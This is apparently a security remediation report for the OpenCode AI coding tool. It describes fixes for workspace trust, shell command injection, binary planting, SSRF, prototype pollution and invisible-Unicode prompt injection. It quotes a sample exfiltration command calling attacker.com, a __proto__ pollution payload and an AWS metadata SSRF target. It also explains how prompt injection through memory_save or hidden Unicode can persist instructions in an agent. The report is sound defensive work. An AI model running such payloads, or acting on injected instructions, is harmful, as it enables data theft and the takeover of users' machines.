# Security Remediation V2: Vulnerability Fixes and Hardening

## Background

In March 2026, Mindgard Research published findings from security testing across 15 AI IDE products, identifying 37 vulnerabilities organized into 25 repeatable patterns across 4 categories. OpenCode was confirmed affected by at least one pattern (1.13, GHSA-vxw4-wv6m-9hhh).

We conducted a two-phase internal audit of the OpenCode codebase against all 25 Mindgard patterns. Phase 1 used Gemini 2.5 Pro agents; Phase 2 used Opus 4.5 and Codex 5.2 agents for deeper structural analysis. The elite audit confirmed **16 VULNERABLE**, 2 PARTIAL, and 7 N/A patterns. The full audit matrix is archived at `/tmp/audit-matrix-v2.md`.

This document records the remediation: what was broken, how it was fixed, and what tradeoffs were made.

---

## Security Gates

The 25 vulnerability patterns map to 9 security gates (G1–G9). Before remediation, none were fully implemented.

| Gate | Description             | Pre-Remediation | Post-Remediation |
| ---- | ----------------------- | --------------- | ---------------- |
| G1   | Config Approval         | NOT IMPLEMENTED | IMPLEMENTED      |
| G2   | Initialization Safety   | NOT IMPLEMENTED | IMPLEMENTED      |
| G3   | Trust Integrity         | NOT IMPLEMENTED | IMPLEMENTED      |
| G4   | File Write Restrictions | PARTIAL         | IMPLEMENTED      |
| G5   | Command Robustness      | NOT IMPLEMENTED | IMPLEMENTED      |
| G6   | Binary Security         | NOT IMPLEMENTED | IMPLEMENTED      |
| G7   | Input Sanitization      | NOT IMPLEMENTED | IMPLEMENTED      |
| G8   | Outbound Controls       | PARTIAL         | IMPLEMENTED      |
| G9   | Network Security        | NOT IMPLEMENTED | IMPLEMENTED      |

---

## Phase 1: Workspace Trust (G1, G2, G3)

**Patterns addressed:** 1.1 (MCP Poisoning), 1.3 (Plugin Auto-Load), 1.5 (Hooks/Init Race), 1.6 (App Config Auto-Exec), 1.7 (Zero-Click RCE via `bun install`), 2.2 (Skill Auto-Load), 3.5 (Model Redirect), 4 (TOCTOU)

### Problem

OpenCode loaded project-scoped configuration, plugins, skills, and MCP servers from workspace files without verifying their integrity. A malicious repository could include an `opencode.json`, `.opencode/` directory, or `SKILL.md` that would execute arbitrary code on first open — before the user performed any action.

Critical vectors:

- `config.ts:259` triggered `bun install` for `.opencode` directories, firing malicious npm lifecycle scripts on startup (Pattern 1.7)
- `plugin/index.ts:98` ran `await import(plugin)` on workspace JS/TS files (Pattern 1.3)
- `skill/skill.ts` loaded `SKILL.md` from workspace without approval (Pattern 2.2)
- Trust was path-based, not content-based — vulnerable to TOCTOU via `git pull` (Pattern 4)

### Fix

**New file: `src/trust/index.ts`**

A content-addressed trust module. `Trust.hash()` computes SHA-256 over the sorted contents of all project-scoped config files, `.opencode` directories, `.claude/skills/`, and `.agents/skills/`. The hash is stored in `~/.config/opencode/trust.json` keyed by project ID.

```typescript
// src/trust/index.ts
export namespace Trust {
  export function status(projectId: string)
  // Returns { approved: boolean, hash: string } from cache

  export async function ensure(projectId: string, hash: string, context?)
  // Compares computed hash against stored hash
  // Returns { approved: false } if unknown or modified

  export async function hash(inputs: string[])
  // SHA-256 over sorted file paths and their contents
}
```

**Modified: `src/config/config.ts` (lines 115–210)**

Config initialization now splits into two stages:

1. Load safe global configs (remote well-known, global user config, custom config path)
2. Compute trust hash of project-level files via `trustInputs()`, then call `Trust.ensure()`
3. If untrusted: **abort immediately** with `"Untrusted or modified workspace configuration detected. Please review the workspace and run 'opencode trust' to proceed."`
4. Only after trust passes: load project configs, install dependencies, load plugins/skills

The `trustInputs()` function (line 115) collects:

- All project config files (`opencode.json`, `opencode.jsonc`)
- All files under `.opencode/` directories
- All `SKILL.md` files under `.claude/skills/` and `.agents/skills/`

This ensures `bun install` (the zero-click RCE vector) never fires for untrusted workspaces.

**Modified: `src/plugin/index.ts` (lines 64–68)**

External plugins are gated on trust status:

```typescript
const trust = Trust.status(Instance.project.id)
let plugins = trust.approved ? (config.plugin ?? []) : []
if (!trust.approved && (config.plugin ?? []).length) {
  log.warn("workspace untrusted; skipping external plugins", { directory: Instance.directory })
}
```

Internal (built-in) plugins still load regardless of trust status.

**Modified: `src/skill/skill.ts` (lines 140–166)**

Project-level skill scanning is gated on trust:

- Global skills (home directory `.claude/skills/`, `.agents/skills/`) and XDG skills always load
- Project-level external skills (`.claude/skills/` under workspace) only load when `trust.approved` is true (line 140)
- `.opencode/skill/` scanning restricts to non-workspace directories when untrusted (lines 151–155)
- Config-defined skill paths and URL-based skills only load when trusted (line 168)

### Tests

`test/config/trust-security.test.ts` — 3 tests:

1. Untrusted workspace rejected before dependency install (`bun install` never fires)
2. Modified workspace after trust detected and rejected
3. Prototype pollution keys scrubbed during config merge

---

## Phase 2: Command Robustness (G5)

**Patterns addressed:** 1.4 (Argument Injection), 1.8 (Terminal Filter Bypass), 1.10 (Safe Exe Config Abuse), 1.11 (Env Var Prefixing)

### Problem

`bash.ts` passed user commands to `child_process.spawn` with `shell: true`, meaning shell metacharacters (`$(...)`, pipes, redirects) were interpreted by the shell. The tree-sitter parser extracted permissions but did not prevent execution of complex shell constructs.

Attack vectors:

- `$(curl attacker.com/exfil?data=...)` bypassed the permission parser (Pattern 1.8)
- `FOO=bar cmd` created a new permission signature that evaded approval checks (Pattern 1.11)
- Approved commands like `git` could be weaponized via `.gitattributes` filter commands (Pattern 1.10)

### Fix

**Modified: `src/tool/bash.ts` (lines 155–380)**

The bash tool now operates in two modes based on the `unsafe` parameter:

**Safe mode (default, `unsafe: false`):**

- Tree-sitter AST parses the command
- Rejects commands containing `command_substitution`, `pipeline`, `subshell`, `expansion`, `variable_expansion`, `parameter_expansion`, `simple_expansion`, `brace_expansion`, or `redirected_statement` (lines 199–209)
- Rejects multiple commands in a single invocation (line 210)
- Extracts `command_name` and arguments via AST into an explicit `argv` array (lines 229–247)
- Parses `variable_assignment` nodes into an `env` map — they become environment variables, not shell-interpreted prefixes (lines 222–227)
- Spawns with `shell: false` and explicit argv: `spawn(exec[0], exec.slice(1), { shell: false, ... })` (line 367)

**Unsafe mode (`unsafe: true`):**

- User explicitly acknowledges complex shell syntax
- Command is passed through the shell: `[shell, shellFlags, "--", cleanedCommand]`
- Environment variable assignments are still extracted and stripped from the command string

The key behavioral change: `shell: false` on line 367 means the OS kernel receives an exact argv array, not a string for shell interpretation. No metacharacter expansion occurs.

### Tests

`test/tool/bash.test.ts` — 26 tests (existing test file, updated to cover new behavior)

---

## Phase 3: Binary Security (G6)

**Patterns addressed:** 1.2 (LSP MITM), 1.9 (LSP Binary Planting)

### Problem

LSP servers for Oxlint and Biome resolved binaries from `node_modules/.bin/` in the workspace, then spawned them automatically on file open. A malicious repository could plant a trojanized `node_modules/.bin/biome` or `node_modules/.bin/oxc_language_server` that would execute without user interaction.

Additionally, LSP binaries downloaded from GitHub (ESLint, TerraformLS, etc.) were not verified against checksums, enabling MITM attacks.

### Fix

**Modified: `src/lsp/server.ts`**

Added two helper functions:

```typescript
// line 67 — Detects workspace-relative paths
const isWorkspace = (input: string) => {
  const root = Filesystem.normalizePath(path.resolve(Instance.worktree))
  const target = Filesystem.normalizePath(path.resolve(input))
  return Filesystem.contains(root, target)
}

// line 73 — Checks OPENCODE_HARDENED_MODE env var and config.hardened
const hardenedMode = async () => {
  if (Flag.OPENCODE_HARDENED_MODE) return true
  const config = await Config.get().catch(() => undefined)
  return config?.hardened ?? false
}
```

**Oxlint (lines 304–364):**

- `resolveBin()` returns `undefined` in hardened mode (line 312), skipping all workspace `.bin` resolution
- For `Bun.which()` results, the binary is accepted only if it's NOT a workspace path in hardened mode: `found && (!hardened || !isWorkspace(found))` (lines 331, 352)

**Biome (lines 397–430):**

- Workspace `node_modules/.bin/biome` skipped when hardened: `!hardened && (await Filesystem.exists(localBin))` (line 401)
- `Bun.which("biome")` result validated: `found && (!hardened || !isWorkspace(found))` (line 404)
- `bun x` fallback disabled in hardened mode: `!bin && !hardened` (line 409)

**Checksum verification (lines 40–65):**

A `verifyChecksum()` function validates SHA-256 checksums for all downloaded LSP binaries:

```typescript
const verifyChecksum = async (opts: { path: string; checksumUrl?: string; assetName: string; context: string }) => {
  if (!opts.checksumUrl) {
    log.error("Missing SHA256 checksum", { context: opts.context, asset: opts.assetName })
    return false // Fail closed
  }
  const expected = await Checksum.fetch(opts.checksumUrl, opts.assetName)
  if (!expected) return false
  await Checksum.verify(opts.path, expected)
  return true
}
```

Applied to all LSP download paths: ESLint (line 244), Gopls (line 771), Ruff (line 1077), Zls (line 1263), Dart (line 1405), Ruby (line 1565), TerraformLS (line 1822).

### Tradeoff

Workspace `.bin` resolution is **allowed by default** to preserve developer workflows. It is blocked only when `OPENCODE_HARDENED_MODE=true` (env var) or `config.hardened` is set. This matches the decision that standard mode favors convenience while hardened mode favors security.

### Tests

`test/lsp/lsp-security.test.ts` — 5 tests:

1. Biome prefers workspace bin when not hardened
2. Biome blocks workspace bin in hardened mode
3. Oxlint prefers workspace bin when not hardened
4. Oxlint blocks workspace bin in hardened mode
5. TerraformLS download requires checksum

---

## Phase 4: Network Security (G8, G9)

**Patterns addressed:** 1.13 (Unauthenticated Local Network), 3.3 (SSRF via Webfetch), 3.6 (DNS Exfil — mitigated by Phase 2)

### Problem

**G9:** The HTTP server's `defaultGatePasses()` returned `true` when no password or API key was configured (GHSA-vxw4-wv6m-9hhh). Any process on the local network could send commands to OpenCode.

**G8:** The `webfetch` tool had zero SSRF protection. An agent could be instructed to fetch `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://192.168.1.1/admin` (router), or any internal service.

### Fix

**G9 — Modified: `src/server/auth-policy.ts` (lines 162–209)**

Added `isLoopbackIP()` helper (line 170) that checks for:

- IPv4 loopback: `127.0.0.0/8`
- IPv6 loopback: `::1`
- IPv4-mapped IPv6 loopback: `::ffff:127.x.x.x`

Modified `defaultGatePasses()` (line 194): when no password and no API key are configured, only loopback IPs are allowed:

```typescript
if (!hasPassword && !hasApiKey) {
  return isLoopbackIP(clientIP)
}
```

**Modified: `src/server/server.ts` (line 206–207):**
The `clientIP` is now extracted from `INTERNAL_CLIENT_IP_HEADER` and passed to `evaluateAuthorization()`.

**G8 — New file: `src/util/ssrf-protection.ts`**

DNS-resolution-before-fetch SSRF protection:

```typescript
export async function validateURLForSSRF(url: string): Promise<SSRFValidationResult> {
  if (!Flag.OPENCODE_HARDENED_MODE) return { allowed: true }
  // 1. Parse URL, check hostname against private IP ranges
  // 2. Check for localhost/localhost subdomains
  // 3. Resolve DNS (both A and AAAA records)
  // 4. Block if ANY resolved IP is private (prevents DNS rebinding)
}
```

Blocked ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `0.0.0.0/8`, `::1`, `fe80::/10`, `fc00::/7`, IPv4-mapped IPv6 addresses (`::ffff:x.x.x.x`).

**Modified: `src/tool/webfetch.ts` (lines 7, 31–36):**
SSRF validation wired in before the `fetch()` call:

```typescript
const ssrfCheck = await validateURLForSSRF(params.url)
if (!ssrfCheck.allowed) {
  throw new Error(`SSRF protection: ${ssrfCheck.reason}`)
}
```

### Tradeoff

SSRF protection is **only enforced when `OPENCODE_HARDENED_MODE=true`**. In standard mode, internal IPs are allowed for developers who legitimately need to access local services. The G9 loopback-only fix applies unconditionally (no hardened mode gate) since there is no valid reason for unauthenticated remote access.

**Modified: `src/flag/flag.ts` (lines 37, 149–158):**
Added `OPENCODE_HARDENED_MODE` as a dynamic getter (runtime evaluation via `Object.defineProperty`) so tests and deployment environments can toggle it.

### Tests

Tests in `test/security/g4-g7-g8-g9-exploits.test.ts`:

- G9: 4 tests (external IP denied, loopback IPv4 allowed, IPv6 loopback allowed, private 10.x denied)
- G8: 7 tests (block 127.0.0.1, 192.168.x, 10.x, 169.254.x, localhost in hardened mode; allow external URLs; allow internal when not hardened)

---

## Phase 5: Input Sanitization & Prototype Pollution (G4, G7)

**Patterns addressed:** 2.1 (Adversarial Dir Names), 2.3 (PI via memory_save), 2.4 (Prototype Pollution), 2.5 (Invisible Unicode)

### Problem

**G7:** No input sanitization was applied to file paths or content loaded into system prompts. A directory named with invisible Unicode or bidi override characters could inject hidden instructions into the agent's context. `instruction.ts` prepended file paths to instructions without sanitization. Instruction content was loaded verbatim, including any embedded zero-width characters.

**G4:** The `memory_save` tool wrote user-supplied content directly to `.opencode/rules/memory.md` and called `InstructionPrompt.invalidateRules()` for immediate hot-reload. An agent tricked by prompt injection could write persistent malicious instructions that infected all future sessions.

**2.4:** The `mergeDeep` function from Remeda was used directly for config merging. A malicious `opencode.json` containing `{"__proto__": {"polluted": true}}` could pollute `Object.prototype` globally.

### Fix

**New file: `src/util/input-sanitization.ts`**

Three sanitization functions:

`stripInvisibleUnicode(text)` — Removes:

- Zero-width characters: `U+200B`–`U+200F`
- Line/paragraph separators and narrow spaces: `U+2028`–`U+202F`
- Byte order mark: `U+FEFF`
- Bidirectional overrides: `U+202A`–`U+202E`, `U+2066`–`U+2069`
- Zero-width joiners and invisible operators: `U+2060`–`U+206F`
- Unicode tag characters: `U+E0000`–`U+E007F`

`sanitizeFilePath(path)` — Strips null bytes, newlines/carriage returns, path traversal sequences (`../`, `..\`), and invisible Unicode.

`sanitizeForStorage(text)` — Validates content for persistent storage. Returns `{ valid: false, reason }` if content contains:

- Invisible Unicode characters
- Markdown code fences (` ``` `)
- HTML tags (`<script>`, etc.)
- YAML frontmatter delimiters (`---`)

Returns `{ valid: true, sanitized }` with newlines collapsed for clean single-line storage.

**Applied sanitization across 5 existing files:**

| File                     | Line(s) | What's sanitized                             |
| ------------------------ | ------- | -------------------------------------------- |
| `session/system.ts`      | 34      | Working directory path in environment prompt |
| `session/instruction.ts` | 216–218 | System instruction file paths and content    |
| `session/instruction.ts` | 233     | Fetched URL instruction content              |
| `session/instruction.ts` | 241     | Rule file paths and content                  |
| `session/instruction.ts` | 287–289 | Resolved instruction file paths and content  |
| `session/instruction.ts` | 314–315 | Path-scoped rule file paths and content      |
| `tool/memory-save.ts`    | 20–23   | Fact content validated before save           |
| `tool/glob.ts`           | 5       | File paths in glob output                    |

**Modified: `src/tool/memory-save.ts` (lines 17–23):**

Content validation before writing:

```typescript
const validation = sanitizeForStorage(params.fact)
if (!validation.valid) {
  throw new Error(`Cannot save fact: ${validation.reason}`)
}
```

The saved content uses `validation.sanitized` (newlines collapsed, content validated).

**Prototype Pollution — Modified: `src/config/config.ts` (lines 40–77):**

`scrubPrototypePollution<T>(obj)` recursively walks an object and removes keys named `__proto__`, `constructor`, or `prototype`. The local `mergeDeep` wrapper applies `scrubPrototypePollution` to both operands before calling Remeda's `remedaMergeDeep`:

```typescript
import { mergeDeep as remedaMergeDeep } from "remeda"

function scrubPrototypePollution<T>(obj: T): T {
  if (obj === null || typeof obj !== "object") return obj
  if (Array.isArray(obj)) return obj.map(scrubPrototypePollution) as T
  const result: Record<string, unknown> = {}
  for (const [key, value] of Object.entries(obj as Record<string, unknown>)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue
    result[key] = scrubPrototypePollution(value)
  }
  return result as T
}

function mergeDeep<T extends object>(target: T, source: T): T {
  return remedaMergeDeep(scrubPrototypePollution(target), scrubPrototypePollution(source))
}
```

Every `mergeDeep` call in config resolution (there are ~12 call sites) now goes through the safe wrapper.

### Tests

Tests in `test/security/g4-g7-g8-g9-exploits.test.ts`:

- G7: 7 tests (strip zero-width, bidi, Unicode tags, BOM; strip path traversal, null bytes, newlines)
- G4: 6 tests (reject invisible Unicode, code fences, HTML tags, YAML frontmatter in memory_save; accept clean facts; integration tests with MemorySaveTool)

Tests in `test/config/trust-security.test.ts`:

- 1 test: Prototype pollution keys scrubbed during config merge (verifies `Object.prototype` is not polluted)

---

## Vulnerability Coverage Matrix (Post-Remediation)

| #    | Pattern                | Pre-Fix Status | Fix                                                             | Gate  |
| ---- | ---------------------- | -------------- | --------------------------------------------------------------- | ----- |
| 1.1  | MCP Config Poisoning   | VULNERABLE     | Trust module blocks untrusted workspace configs                 | G1    |
| 1.2  | LSP MITM               | VULNERABLE     | SHA-256 checksum verification for all LSP downloads             | G6    |
| 1.3  | Plugin Auto-Load       | VULNERABLE     | External plugins gated on trust status                          | G1    |
| 1.4  | Argument Injection     | VULNERABLE     | AST-based argv extraction, `shell: false`                       | G5    |
| 1.5  | Hooks/Init Race        | VULNERABLE     | Trust gates plugin loading entirely for untrusted workspaces    | G1    |
| 1.6  | App Config Auto-Exec   | VULNERABLE     | Trust module aborts before config-triggered execution           | G1    |
| 1.7  | Zero-Click RCE         | VULNERABLE     | Trust check before `bun install` (dependency install)           | G2    |
| 1.8  | Terminal Filter Bypass | VULNERABLE     | Reject command_substitution/pipeline unless `unsafe: true`      | G5    |
| 1.9  | Binary Planting        | VULNERABLE     | Hardened mode blocks workspace `.bin` resolution                | G6    |
| 1.10 | Safe Exe Config Abuse  | VULNERABLE     | AST parsing + explicit argv prevents shell interpretation       | G5    |
| 1.11 | Env Var Prefixing      | VULNERABLE     | Variable assignments parsed into env map, not shell prefix      | G5    |
| 1.13 | Unauth Local Network   | VULNERABLE     | Loopback-only when no credentials configured                    | G9    |
| 2.1  | Adversarial Dir Names  | VULNERABLE     | `sanitizeFilePath()` on all paths in system/instruction prompts | G7    |
| 2.2  | Skill Auto-Load        | VULNERABLE     | Project-level skills gated on trust status                      | G1    |
| 2.3  | PI via memory_save     | VULNERABLE     | `sanitizeForStorage()` rejects injection payloads               | G4    |
| 2.4  | Prototype Pollution    | VULNERABLE     | `scrubPrototypePollution()` before all `mergeDeep` calls        | G1    |
| 2.5  | Invisible Unicode      | VULNERABLE     | `stripInvisibleUnicode()` on all loaded instruction content     | G7    |
| 3.3  | SSRF via Webfetch      | VULNERABLE     | DNS resolution + private IP blocking in hardened mode           | G8    |
| 3.5  | Model Redirect         | VULNERABLE     | Trust module blocks untrusted MCP/model configs                 | G1    |
| 3.6  | DNS Exfil              | PARTIAL        | Mitigated by G5 (shell injection blocked)                       | G5/G8 |
| 4    | Trust TOCTOU           | VULNERABLE     | Content-addressed SHA-256 hashing (not path-based)              | G3    |

---

## `OPENCODE_HARDENED_MODE`

An environment variable that enables strict security controls for production and enterprise deployments.

**What it restricts:**

| Feature                    | Standard Mode (default) | Hardened Mode                               |
| -------------------------- | ----------------------- | ------------------------------------------- |
| LSP workspace `.bin`       | Allowed                 | Blocked — system PATH only                  |
| `bun x` fallback for Biome | Allowed                 | Blocked                                     |
| SSRF (internal IPs)        | Allowed                 | Blocked — DNS resolution + private IP check |
| Workspace trust            | Required                | Required (same)                             |
| Auth (no credentials)      | Loopback-only           | Loopback-only (same)                        |

**Enable:** `export OPENCODE_HARDENED_MODE=true` or set `config.hardened: true` in `opencode.json`.

The flag is declared in `src/flag/flag.ts` as a dynamic getter (`Object.defineProperty`) so it can be toggled at runtime (useful for tests and CI environments).

---

## Test Inventory

| File                                         | Tests  | Gates Covered   |
| -------------------------------------------- | ------ | --------------- |
| `test/config/trust-security.test.ts`         | 3      | G1, G2, G3      |
| `test/tool/bash.test.ts`                     | 26     | G5              |
| `test/lsp/lsp-security.test.ts`              | 5      | G6              |
| `test/security/g4-g7-g8-g9-exploits.test.ts` | 25     | G4, G7, G8, G9  |
| **Total**                                    | **59** | **All 9 gates** |

All tests follow the testing mandate: each exploit test proves the vulnerability exists (would fail pre-fix), then passes after the fix is applied.

---

## Files Changed

### New Files (3)

| File                             | Purpose                                                  |
| -------------------------------- | -------------------------------------------------------- |
| `src/trust/index.ts`             | Workspace trust module (SHA-256, cache, persistence)     |
| `src/util/ssrf-protection.ts`    | SSRF DNS validation and private IP blocking              |
| `src/util/input-sanitization.ts` | Unicode stripping, path sanitization, storage validation |

### Modified Files (12)

| File                         | Changes                                                                                   |
| ---------------------------- | ----------------------------------------------------------------------------------------- |
| `src/config/config.ts`       | Trust integration, `trustInputs()`, `scrubPrototypePollution()`, safe `mergeDeep` wrapper |
| `src/plugin/index.ts`        | External plugin gating on trust status                                                    |
| `src/skill/skill.ts`         | Project-level skill gating on trust status                                                |
| `src/tool/bash.ts`           | `shell: false`, AST safety gate, env var parsing, `unsafe` parameter                      |
| `src/lsp/server.ts`          | `hardenedMode()`, `isWorkspace()`, workspace `.bin` blocking, `verifyChecksum()`          |
| `src/tool/webfetch.ts`       | SSRF validation before fetch                                                              |
| `src/tool/memory-save.ts`    | Content validation via `sanitizeForStorage()`                                             |
| `src/session/system.ts`      | Path sanitization in environment prompt                                                   |
| `src/session/instruction.ts` | Path and content sanitization for all instruction sources                                 |
| `src/tool/glob.ts`           | Path sanitization in output                                                               |
| `src/server/auth-policy.ts`  | `isLoopbackIP()`, loopback-only default auth, `clientIP` parameter                        |
| `src/flag/flag.ts`           | `OPENCODE_HARDENED_MODE` dynamic getter                                                   |

### New Test Files (2)

| File                                         | Tests                       |
| -------------------------------------------- | --------------------------- |
| `test/lsp/lsp-security.test.ts`              | 5 LSP binary security tests |
| `test/security/g4-g7-g8-g9-exploits.test.ts` | 25 exploit tests            |

### Modified Test Files (2)

| File                                 | Changes                                                               |
| ------------------------------------ | --------------------------------------------------------------------- |
| `test/tool/bash.test.ts`             | Updated for `shell: false` behavior                                   |
| `test/config/trust-security.test.ts` | 3 trust + prototype pollution tests                                   |
| `test/fixture/fixture.ts`            | Auto-writes `trust.json` for test tmpdir (opt-out via `trust: false`) |

---

## Design Decisions

1. **Trust UX:** The CLI aborts and instructs the user to run `opencode trust`. There is no inline interactive prompt. This was chosen because an interactive "Trust this workspace? [y/n]" can be auto-accepted by malicious tooling.

2. **Hardened mode is opt-in:** Workspace `.bin` resolution and internal IP access are allowed by default. Blocking them by default would break too many existing workflows. Enterprise deployments should set `OPENCODE_HARDENED_MODE=true`.

3. **G9 is unconditional:** The loopback-only auth fix when no credentials are configured applies in all modes. There is no valid reason for unauthenticated access from non-loopback IPs, even in development.

4. **`sanitizeForStorage` is strict:** Code fences, HTML tags, and YAML frontmatter are all rejected in `memory_save` facts. This may reject some legitimate content, but the attack surface (persistent cross-session infection) justifies the strictness.
